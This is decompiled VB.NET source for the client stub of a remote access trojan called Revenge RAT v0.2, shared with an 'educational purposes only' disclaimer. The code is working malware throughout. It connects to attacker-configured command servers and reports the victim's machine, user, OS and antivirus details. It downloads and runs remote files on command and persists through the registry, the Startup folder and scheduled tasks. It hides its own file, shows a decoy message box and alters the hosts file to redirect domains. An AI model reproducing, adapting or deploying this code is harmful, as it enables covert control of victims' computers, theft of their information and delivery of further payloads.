'This S.R.C Client Of Revenge RAT V0.2 Maded By (N A P O L E O N) EXTRACTED By StalkerDz (AKA CaptainDz)
'Spécial Thank's to (N A P O L E O N) For Making This Great RAT
'This Src is only  for educational purposes only 
'Facebook : https://www.facebook.com/StlakerDz
'Skype : Sofiane.blida5


Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports Microsoft.VisualBasic.Devices
Imports Microsoft.Win32
Imports System
Imports System.Diagnostics
Imports System.Globalization
Imports System.IO
Imports System.Net
Imports System.Net.Sockets
Imports System.Runtime.CompilerServices
Imports System.Threading
Imports System.Windows.Forms
Imports System.Environment

Namespace Stub
    Public Class Main

        Public Sub New()
            Me.StartConnect = New Thread(New ThreadStart(AddressOf Me.Connect), 1)
            Me.StartInstall = New Thread(New ThreadStart(AddressOf Me.Insta))
            Me.PT = New Thread(New ThreadStart(AddressOf Me.Pin))
            Me.I = 1
            Me.MS = 0
        End Sub

        <CompilerGenerated, DebuggerStepThrough> _
        Private Shared Sub _Lambda__1(ByVal a0 As Object, ByVal a1 As EventArgs)

        End Sub

        <CompilerGenerated> _
        Private Shared Sub _Lambda__2()
            Func.mtx.ReleaseMutex()
        End Sub

        <CompilerGenerated, DebuggerStepThrough> _
        Private Sub _Lambda__3(ByVal a0 As Object)
            Me.data(DirectCast(a0, Byte()))
        End Sub

        Public Sub Connect()
            Dim flagArray As Boolean()
            Dim num2 As Integer
            Dim counterHosts As Integer
            Dim hosts As String()
            Dim instance As Object = New MemoryStream
            Dim num As Integer = 0
Label_000A:
            Try
                If (((Me.C Is Nothing) OrElse Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(NewLateBinding.LateGet(Me.C, Nothing, "Client", New Object(0 - 1) {}, Nothing, Nothing, Nothing), Nothing, "Connected", New Object(0 - 1) {}, Nothing, Nothing, Nothing), False, False)) OrElse Not Me.Cn) Then
                    GoTo Label_04D9
                End If
                num += 1
                If (num > 500) Then
                    num = 0
                    If Conversions.ToBoolean(Operators.AndObject(NewLateBinding.LateGet(NewLateBinding.LateGet(Me.C, Nothing, "Client", New Object(0 - 1) {}, Nothing, Nothing, Nothing), Nothing, "Poll", New Object() {-1, SelectMode.SelectRead}, Nothing, Nothing, Nothing), Operators.CompareObjectLessEqual(NewLateBinding.LateGet(NewLateBinding.LateGet(Me.C, Nothing, "Client", New Object(0 - 1) {}, Nothing, Nothing, Nothing), Nothing, "Available", New Object(0 - 1) {}, Nothing, Nothing, Nothing), 0, False))) Then
                        GoTo Label_04D9
                    End If
                End If
                If Operators.ConditionalCompareObjectGreater(NewLateBinding.LateGet(Me.C, Nothing, "Available", New Object(0 - 1) {}, Nothing, Nothing, Nothing), 0, False) Then
                    Dim buffer As Byte() = New Byte((Conversions.ToInteger(Operators.SubtractObject(NewLateBinding.LateGet(Me.C, Nothing, "Available", New Object(0 - 1) {}, Nothing, Nothing, Nothing), 1)) + 1) - 1) {}
                    Dim arguments As Object() = New Object() {buffer, 0, buffer.Length, SocketFlags.None}
                    flagArray = New Boolean() {True, False, False, False}
                    NewLateBinding.LateCall(NewLateBinding.LateGet(Me.C, Nothing, "Client", New Object(0 - 1) {}, Nothing, Nothing, Nothing), Nothing, "Receive", arguments, Nothing, Nothing, flagArray, True)
                    If flagArray(0) Then
                        buffer = DirectCast(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(arguments(0)), GetType(Byte())), Byte())
                    End If
                    Dim objArray As Object() = New Object() {buffer, 0, buffer.Length}
                    flagArray = New Boolean() {True, False, False}
                    NewLateBinding.LateCall(instance, Nothing, "Write", objArray, Nothing, Nothing, flagArray, True)
                    If flagArray(0) Then
                        buffer = DirectCast(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray(0)), GetType(Byte())), Byte())
                    End If
                    Do While True
                        If Not Func.BS(DirectCast(NewLateBinding.LateGet(instance, Nothing, "ToArray", New Object(0 - 1) {}, Nothing, Nothing, Nothing), Byte())).Contains(SPL) Then
                            GoTo Label_04CB
                        End If
                        Dim array As Array = Func.fx(DirectCast(NewLateBinding.LateGet(instance, Nothing, "ToArray", New Object(0 - 1) {}, Nothing, Nothing, Nothing), Byte()), SPL)
                        Dim yyy As Thread = New Thread(New ParameterizedThreadStart(AddressOf Me._Lambda__3)) : yyy.Start(RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet(array, New Object() {0}, Nothing)))
                        NewLateBinding.LateCall(instance, Nothing, "Dispose", New Object(0 - 1) {}, Nothing, Nothing, Nothing, True)
                        instance = New MemoryStream
                        If (array.Length <> 2) Then
                            GoTo Label_04CB
                        End If
                        Dim objArray5 As Object() = New Object(3 - 1) {}
                        objArray = New Object(1 - 1) {}
                        num2 = 1
                        objArray(0) = num2
                        objArray5(0) = RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet(array, objArray, Nothing))
                        objArray5(1) = 0
                        Dim objArray3 As Object() = New Object(1 - 1) {}
                        arguments = objArray3
                        counterHosts = 0
                        Dim obj3 As Object = 1
                        arguments(counterHosts) = RuntimeHelpers.GetObjectValue(obj3)
                        Dim objArray4 As Object() = arguments
                        hosts = Nothing
                        objArray5(2) = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(NewLateBinding.LateIndexGet(array, objArray4, hosts), Nothing, "length", New Object(0 - 1) {}, Nothing, Nothing, Nothing))
                        Dim objArray6 As Object() = objArray5
                        flagArray = New Boolean() {True, False, True}
                        NewLateBinding.LateCall(instance, Nothing, "Write", objArray6, Nothing, Nothing, flagArray, True)
                        If flagArray(0) Then
                            NewLateBinding.LateIndexSetComplex(array, New Object() {num2, RuntimeHelpers.GetObjectValue(objArray6(0))}, Nothing, True, False)
                        End If
                        If flagArray(2) Then
                            arguments = objArray3
                            arguments(counterHosts) = RuntimeHelpers.GetObjectValue(obj3)
                            NewLateBinding.LateSetComplex(NewLateBinding.LateIndexGet(array, objArray4, hosts), Nothing, "length", New Object() {RuntimeHelpers.GetObjectValue(objArray6(2))}, Nothing, Nothing, True, True)
                        End If
                    Loop
                End If
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                ProjectData.ClearProjectError()
                GoTo Label_04D9
                ProjectData.ClearProjectError()
            End Try
Label_04CB:
            Thread.Sleep(1)
            GoTo Label_000A
Label_04D9:
            Me.Cn = False
            Try
                NewLateBinding.LateCall(NewLateBinding.LateGet(Me.C, Nothing, "Client", New Object(0 - 1) {}, Nothing, Nothing, Nothing), Nothing, "Disconnect", New Object() {False}, Nothing, Nothing, Nothing, True)
            Catch exception6 As Exception
                ProjectData.SetProjectError(exception6)
                Dim exception2 As Exception = exception6
                ProjectData.ClearProjectError()
            End Try
            Try
                NewLateBinding.LateCall(instance, Nothing, "Dispose", New Object(0 - 1) {}, Nothing, Nothing, Nothing, True)
            Catch exception7 As Exception
                ProjectData.SetProjectError(exception7)
                Dim exception3 As Exception = exception7
                ProjectData.ClearProjectError()
            End Try
            instance = New MemoryStream
            Thread.Sleep(&H7D0)
            Try
                NewLateBinding.LateCall(Func.Shadowx, Nothing, "Kill", New Object(0 - 1) {}, Nothing, Nothing, Nothing, True)
                Func.Shadowx = Nothing
            Catch exception8 As Exception
                ProjectData.SetProjectError(exception8)
                Dim exception4 As Exception = exception8
                ProjectData.ClearProjectError()
            End Try
            Try
                Me.C = New TcpClient
                NewLateBinding.LateSet(Me.C, Nothing, "ReceiveTimeout", New Object() {&H2710}, Nothing, Nothing)
                NewLateBinding.LateSet(Me.C, Nothing, "SendTimeout", New Object() {&H2710}, Nothing, Nothing)
                NewLateBinding.LateSet(Me.C, Nothing, "SendBufferSize", New Object() {&H32000}, Nothing, Nothing)
                NewLateBinding.LateSet(Me.C, Nothing, "ReceiveBufferSize", New Object() {&H32000}, Nothing, Nothing)
                NewLateBinding.LateSetComplex(NewLateBinding.LateGet(Me.C, Nothing, "Client", New Object(0 - 1) {}, Nothing, Nothing, Nothing), Nothing, "SendBufferSize", New Object() {&H32000}, Nothing, Nothing, False, True)
                NewLateBinding.LateSetComplex(NewLateBinding.LateGet(Me.C, Nothing, "Client", New Object(0 - 1) {}, Nothing, Nothing, Nothing), Nothing, "ReceiveBufferSize", New Object() {&H32000}, Nothing, Nothing, False, True)
                num = 0
                If Not Me.Cn Then
                    If (Me.Hosts.Length <> Func.CounterHosts) Then
                        Dim objArray8 As Object() = New Object(2 - 1) {}
                        hosts = Me.Hosts
                        counterHosts = Func.CounterHosts
                        objArray8(0) = hosts(counterHosts)
                        Dim ports As String() = Me.Ports
                        num2 = Func.CounterHosts
                        objArray8(1) = ports(num2)
                        Dim objArray7 As Object() = objArray8
                        flagArray = New Boolean() {True, True}
                        NewLateBinding.LateCall(NewLateBinding.LateGet(Me.C, Nothing, "Client", New Object(0 - 1) {}, Nothing, Nothing, Nothing), Nothing, "Connect", objArray7, Nothing, Nothing, flagArray, True)
                        If flagArray(0) Then
                            hosts(counterHosts) = CStr(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray7(0)), GetType(String)))
                        End If
                        If flagArray(1) Then
                            ports(num2) = CStr(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray7(1)), GetType(String)))
                        End If
                    Else
                        Func.CounterHosts = 0
                    End If
                    Me.OH = Me.Hosts(Func.CounterHosts)
                    Me.OP = Me.Ports(Func.CounterHosts)
                End If
                Me.Cn = True
            Catch exception9 As Exception
                ProjectData.SetProjectError(exception9)
                Dim exception5 As Exception = exception9
                Func.CounterHosts += 1
                Thread.Sleep(&H9C4)
                ProjectData.ClearProjectError()
                GoTo Label_04D9
                ProjectData.ClearProjectError()
            End Try
            GoTo Label_000A
        End Sub

        <MethodImpl((MethodImplOptions.NoOptimization Or MethodImplOptions.NoInlining))> _
        Public Sub data(ByVal b As Byte())
            Dim strArray As String() = Strings.Split(Func.BS(b), Func.Key, -1, CompareMethod.Binary)
            Try
                Select Case strArray(0)
                    Case "Information"
                        NewLateBinding.LateCall(Me, Nothing, "Send", New Object() {Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((((("Information" & Func.Key) & Func.id & "_") & Func.HWD & Func.Key) & Func.LocalIP & Func.Key), Func.Encode((Environment.MachineName & " / " & Environment.UserName))), Func.Key), Func.CheckCam), Func.Key), Func.Encode((info.OSFullName & " " & Func.GenerateOperatingSystem))), Func.Key), Func.motherborde), Func.Key), info.TotalPhysicalMemory), Func.Key), Func.GetProduct("Select * from AntiVirusProduct")), Func.Key), Func.GetProduct("SELECT * FROM FirewallProduct")), Func.Key), "0.2"), Func.Key), Func.Port), Func.Key), Func.Encode(Func.Password)), Func.Key), Func.Encode(CultureInfo.CurrentCulture.Name))}, Nothing, Nothing, Nothing, True)
                        NewLateBinding.LateCall(Me, Nothing, "Send", New Object() {Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(((("Not" & Func.Key) & Func.id & "_") & Func.HWD & "NotiSplit"), Func.Encode((Environment.MachineName & " / " & Environment.UserName))), "NotiSplit"), Func.Encode((info.OSFullName & " " & Func.GenerateOperatingSystem)))}, Nothing, Nothing, Nothing, True)
                        Me.PT.Start()
                        Me.Send(("Ping" & Func.Key & Conversions.ToString(Me.MS)))
                        Return
                    Case "PingCon"
                        Me.I = 0
                        Me.Send("PingCon")
                        Return
                    Case "Ping"
                        Me.I = 1
                        Me.Send(("Ping" & Func.Key & Conversions.ToString(Me.MS)))
                        Me.MS = 0
                        NewLateBinding.LateCall(Me, Nothing, "Send", New Object() {Operators.ConcatenateObject(("AW" & Func.Key), Func.Encode(Func.GetCaption))}, Nothing, Nothing, Nothing, True)
                        Return
                    Case "RunFileFromLink"
                        File.WriteAllBytes((Path.GetTempPath & strArray(2)), New WebClient().DownloadData(strArray(1)))
                        Process.Start((Path.GetTempPath & strArray(2)))
                        Return
                    Case "RunFileFromDisk"
                        File.WriteAllBytes((Path.GetTempPath & strArray(1)), Convert.FromBase64String(strArray(2)))
                        Thread.Sleep(&H3E8)
                        Process.Start((Path.GetTempPath & strArray(1)))
                        Return
                    Case "UpdateFileFromDisk"
                        File.WriteAllBytes((Path.GetTempPath & strArray(1)), Convert.FromBase64String(strArray(2)))
                        Thread.Sleep(&H3E8)
                        Process.Start((Path.GetTempPath & strArray(1)))
                        Me.UNSV()
                        Return
                    Case "UpdateileFromLink"
                        File.WriteAllBytes((Path.GetTempPath & strArray(2)), New WebClient().DownloadData(strArray(1)))
                        Process.Start((Path.GetTempPath & strArray(2)))
                        Me.UNSV()
                        Return
                    Case "Uninstallv"
                        Me.UNSV()
                        Return
                    Case "Restartv"
                        Application.Restart()
                        ProjectData.EndApp()
                        Return
                    Case "Closev"
                        ProjectData.EndApp()
                        Exit Select
                    Case "LoadPlugin"
                        Func.InvokePlugin(Me.OH, Me.OP, strArray(1), strArray(2), (Func.id & "_"), Func.HWD, strArray(3), Conversions.ToInteger(strArray(4)), Conversions.ToBoolean(strArray(5)))
                        Exit Select
                End Select
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                ProjectData.ClearProjectError()
            End Try
        End Sub
        'تثبيت السيرفر 
        <MethodImpl((MethodImplOptions.NoOptimization Or MethodImplOptions.NoInlining))> _
        Public Sub Insta()
            Thread.Sleep(&H7530)
            If Conversions.ToBoolean(Func.RegCheck) Then
                Registry.SetValue(Func.RegPath, Func.RegValue, Application.ExecutablePath)
            End If
            If (Conversions.ToBoolean(Func.StartupCheack) AndAlso Not File.Exists((Environment.GetFolderPath(SpecialFolder.Startup) & "\" & Func.ServerNameSt))) Then
                File.Copy(Application.ExecutablePath, (Environment.GetFolderPath(SpecialFolder.Startup) & "\" & Func.ServerNameSt))
                Process.Start((Environment.GetFolderPath(SpecialFolder.Startup) & "\" & Func.ServerNameSt))
                ProjectData.EndApp()
            End If
            If Conversions.ToBoolean(Func.ShortCheack) Then
                Func.ShortCutCreate(Func.ShortCutName, Application.ExecutablePath)
            End If
            If Conversions.ToBoolean(Func.CheackShulderTask) Then
                Interaction.Shell(String.Concat(New String() {"schtasks /create /sc minute /mo ", Func.SCHTaskTiem, " /tn ", Func.SCHTaskName, " /tr ", Application.ExecutablePath}), AppWinStyle.Hide, False, -1)
            End If
            If Conversions.ToBoolean(Func.InstallIno) Then
                Try
                    If Not Directory.Exists(Func.Installinop) Then
                        Directory.CreateDirectory(Func.Installinop)
                    End If
                    File.Copy(Application.ExecutablePath, (Func.Installinop & "\" & Func.InstallinoF))
                    Process.Start((Func.Installinop & "\" & Func.InstallinoF))
                    ProjectData.EndApp()
                Catch exception1 As Exception
                    ProjectData.SetProjectError(exception1)
                    ProjectData.ClearProjectError()
                End Try
            End If
            If Conversions.ToBoolean(Func.CheckIfCopy) Then
                Dim path As String = String.Empty
                If (Func.FolderCopy = "Temp") Then
                    path = (IO.Path.GetTempPath & Func.ServerName)
                Else
                    path = (Environment.GetFolderPath(DirectCast(Conversions.ToInteger(Func.FolderCopy), SpecialFolder)) & "\" & Func.ServerName)
                End If
                If Not File.Exists(path) Then
                    File.Copy(Application.ExecutablePath, path)
                    Process.Start(path)
                    ProjectData.EndApp()
                End If
            End If

            'التعديل على ملف الهوست 
            If Conversions.ToBoolean(Func.Hostsfile) Then
                Dim strArray2 As String() = Func.dnsnameb.Split(New Char() {"\"c})
                Dim strArray As String() = Func.ipaddresshost.Split(New Char() {"\"c})
                Dim index As Integer = 0
                Dim str5 As String
                For Each str5 In strArray2
                    Dim str3 As String = (Environment.GetFolderPath(SpecialFolder.System) & "\drivers\etc\hosts")
                    Dim reader As New StreamReader(str3)
                    Dim str4 As String = reader.ReadToEnd
                    Dim str2 As String = String.Concat(New String() {str4, ChrW(13) & ChrW(10), strArray(index), " ", str5})
                    reader.Close()
                    Dim writer As New StreamWriter(str3)
                    writer.Write(str2)
                    writer.Close()
                    index += 1
                Next
            End If
        End Sub

        <STAThread> _
        Public Shared Sub Main()
            SK.Run()
        End Sub

        Public Sub Pin()
            Do While True
                If (Me.I = 0) Then
                    Me.MS += 1
                End If
                Thread.Sleep(1)
            Loop
        End Sub

        <MethodImpl((MethodImplOptions.NoOptimization Or MethodImplOptions.NoInlining))> _
        Public Sub Run()
            Func.mtx = New Mutex(True, Func.MutexID, Me.owner)
            If Not Me.owner Then
                ProjectData.EndApp()
            End If
            AddHandler Application.ApplicationExit, New EventHandler(AddressOf _Lambda__1)
            If Conversions.ToBoolean(Func.Sleep) Then
                Thread.Sleep(CInt(Math.Round(CDbl((Conversions.ToDouble(Func.SleepTime) * 1000)))))
            End If
            If Conversions.ToBoolean(Func.CheckHide) Then
                File.SetAttributes(Application.ExecutablePath, FileAttributes.Hidden)
            End If
            If Conversions.ToBoolean(Func.MessgboxFakeCheck) Then
                Func.FakeMessgbox(Func.Text, Func.Title, DirectCast(Conversions.ToInteger(Func.Button), MessageBoxButtons), DirectCast(Conversions.ToInteger(Func.Iconn), MessageBoxIcon))
            End If
            If Conversions.ToBoolean(Func.EncryptHOstPort) Then
                Dim str As String = Conversions.ToString(Func.Decode(Func.Host))
                Dim str2 As String = Conversions.ToString(Func.Decode(Func.Port))
                Me.Hosts = str.Split(New Char() {"\"c})
                Me.Ports = str2.Split(New Char() {"\"c})
            Else
                Me.Hosts = Func.Host.Split(New Char() {"\"c})
                Me.Ports = Func.Port.Split(New Char() {"\"c})
            End If
            NewLateBinding.LateCall(Me.StartConnect, Nothing, "Start", New Object(0 - 1) {}, Nothing, Nothing, Nothing, True)
            Me.StartInstall.Start()
        End Sub

        Public Sub Send(ByVal b As Byte())
            If Me.Cn Then
                Try
                    Dim instance As Object = New MemoryStream
                    Dim arguments As Object() = New Object() {b, 0, b.Length}
                    Dim copyBack As Boolean() = New Boolean() {True, False, False}
                    NewLateBinding.LateCall(instance, Nothing, "Write", arguments, Nothing, Nothing, copyBack, True)
                    If copyBack(0) Then
                        b = DirectCast(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(arguments(0)), GetType(Byte())), Byte())
                    End If
                    NewLateBinding.LateCall(instance, Nothing, "Write", New Object() {Func.SB(SPL), 0, SPL.Length}, Nothing, Nothing, Nothing, True)
                    arguments = New Object(4 - 1) {}
                    Dim obj3 As Object = instance
                    arguments(0) = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(obj3, Nothing, "ToArray", New Object(0 - 1) {}, Nothing, Nothing, Nothing))
                    arguments(1) = 0
                    Dim obj4 As Object = instance
                    arguments(2) = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(obj4, Nothing, "Length", New Object(0 - 1) {}, Nothing, Nothing, Nothing))
                    arguments(3) = SocketFlags.None
                    Dim objArray As Object() = arguments
                    copyBack = New Boolean() {True, False, True, False}
                    NewLateBinding.LateCall(NewLateBinding.LateGet(Me.C, Nothing, "Client", New Object(0 - 1) {}, Nothing, Nothing, Nothing), Nothing, "Send", objArray, Nothing, Nothing, copyBack, True)
                    If copyBack(0) Then
                        NewLateBinding.LateSetComplex(obj3, Nothing, "ToArray", New Object() {RuntimeHelpers.GetObjectValue(objArray(0))}, Nothing, Nothing, True, False)
                    End If
                    If copyBack(2) Then
                        NewLateBinding.LateSetComplex(obj4, Nothing, "Length", New Object() {RuntimeHelpers.GetObjectValue(objArray(2))}, Nothing, Nothing, True, False)
                    End If
                    NewLateBinding.LateCall(instance, Nothing, "Dispose", New Object(0 - 1) {}, Nothing, Nothing, Nothing, True)
                Catch exception1 As Exception
                    ProjectData.SetProjectError(exception1)
                    Dim exception As Exception = exception1
                    Me.Cn = False
                    ProjectData.ClearProjectError()
                End Try
            End If
        End Sub

        Public Sub Send(ByVal S As String)
            Me.Send(Func.SB(S))
        End Sub
        ' حذف السيرفر من  الجهاز 
        <MethodImpl((MethodImplOptions.NoOptimization Or MethodImplOptions.NoInlining))> _
        Public Function UNSV() As Object
            Dim obj2 As Object
            Dim num2 As Integer
            Try
                Dim num3 As Integer
Label_0001:
                ProjectData.ClearProjectError()
                Dim num As Integer = -2
Label_0009:
                num3 = 2
                If Not Conversions.ToBoolean(Func.ShortCheack) Then
                    GoTo Label_0040
                End If
Label_001C:
                num3 = 3
                File.Delete((Environment.GetFolderPath(SpecialFolder.Startup) & "\" & Func.ShortCutName & ".url"))
Label_0040:
                num3 = 5
                If Not Conversions.ToBoolean(Func.CheackShulderTask) Then
                    GoTo Label_0074
                End If
Label_0053:
                num3 = 6
                Interaction.Shell(("SCHTASKS /Delete /TN """ & Func.SCHTaskName & """ /F"), AppWinStyle.Hide, True, -1)
Label_0074:
                num3 = 8
                If Not Conversions.ToBoolean(Func.StartupCheack) Then
                    GoTo Label_00D0
                End If
Label_0087:
                num3 = 9
                Interaction.Shell(String.Concat(New String() {"cmd.exe /k ping 0 & del """, Environment.GetFolderPath(SpecialFolder.Startup), "\", Func.ServerNameSt, """ & exit"}), AppWinStyle.Hide, False, -1)
Label_00D0:
                num3 = 11
                If Not Conversions.ToBoolean(Func.InstallIno) Then
                    GoTo Label_010B
                End If
Label_00E4:
                num3 = 12
                Interaction.Shell(("cmd.exe /k ping 0 & del """ & Func.Installinop & Func.InstallinoF & """ & exit"), AppWinStyle.Hide, False, -1)
Label_010B:
                num3 = 14
                If Not Conversions.ToBoolean(Func.CheckIfCopy) Then
                    GoTo Label_01BF
                End If
Label_0122:
                num3 = 15
                If (Func.FolderCopy <> "Temp") Then
                    GoTo Label_0167
                End If
Label_013F:
                num3 = &H10
                Interaction.Shell(("cmd.exe /k ping 0 & del """ & Path.GetTempPath & Func.ServerName & """ & exit"), AppWinStyle.Hide, False, -1)
                GoTo Label_01BF
Label_0167:
                num3 = &H12
Label_016C:
                num3 = &H13
                Interaction.Shell(String.Concat(New String() {"cmd.exe /k ping 0 & del """, Environment.GetFolderPath(DirectCast(Conversions.ToInteger(Func.FolderCopy), SpecialFolder)), "\", Func.ServerName, """ & exit"}), AppWinStyle.Hide, False, -1)
Label_01BF:
                num3 = &H16
                Interaction.Shell(("cmd.exe /k ping 0 & del """ & New FileInfo(Application.ExecutablePath).FullName & """ & exit"), AppWinStyle.Hide, False, -1)
                ProjectData.EndApp()
                GoTo Label_02AA
Label_01FB:
                num2 = 0
                Select Case (num2 + 1)
                    Case 1
                        GoTo Label_0001
                    Case 2
                        GoTo Label_0009
                    Case 3
                        GoTo Label_001C
                    Case 4, 5
                        GoTo Label_0040
                    Case 6
                        GoTo Label_0053
                    Case 7, 8
                        GoTo Label_0074
                    Case 9
                        GoTo Label_0087
                    Case 10, 11
                        GoTo Label_00D0
                    Case 12
                        GoTo Label_00E4
                    Case 13, 14
                        GoTo Label_010B
                    Case 15
                        GoTo Label_0122
                    Case &H10
                        GoTo Label_013F
                    Case &H11, 20, &H15, &H16
                        GoTo Label_01BF
                    Case &H12
                        GoTo Label_0167
                    Case &H13
                        GoTo Label_016C
                    Case &H17
                        GoTo Label_02AA
                    Case Else
                        GoTo Label_029F
                End Select
Label_0264:
                num2 = num3
                Select Case IIf((num > -2), num, 1)
                    Case 0
                        GoTo Label_029F
                    Case 1
                        GoTo Label_01FB
                End Select
            Catch obj1 As Exception
                ProjectData.SetProjectError(DirectCast(obj1, Exception))
                GoTo Label_0264
            End Try
Label_029F:
            Throw ProjectData.CreateProjectError(-2146828237)
Label_02AA:
            If (num2 <> 0) Then
                ProjectData.ClearProjectError()
            End If
            Return obj2
        End Function


        ' Fields
        Public C As Object = Nothing
        Public Cn As Boolean = False
        Public Hosts As String()
        Private I As Integer
        Public Shared info As ComputerInfo = New ComputerInfo
        Private MS As Integer
        Public OH As String
        Public OP As String
        Public owner As Boolean = False
        Public Ports As String()
        Private PT As Thread
        Public Shared SK As Main = New Main
        Public Shared SPL As String = "v_B01<3" 'سترينغ  تقسيم  السوكت  غيره كما تريد و لاتنسى تغييره  في السيرفر بالتنقيح 
        Public StartConnect As Object
        Public StartInstall As Thread
    End Class
End Namespace

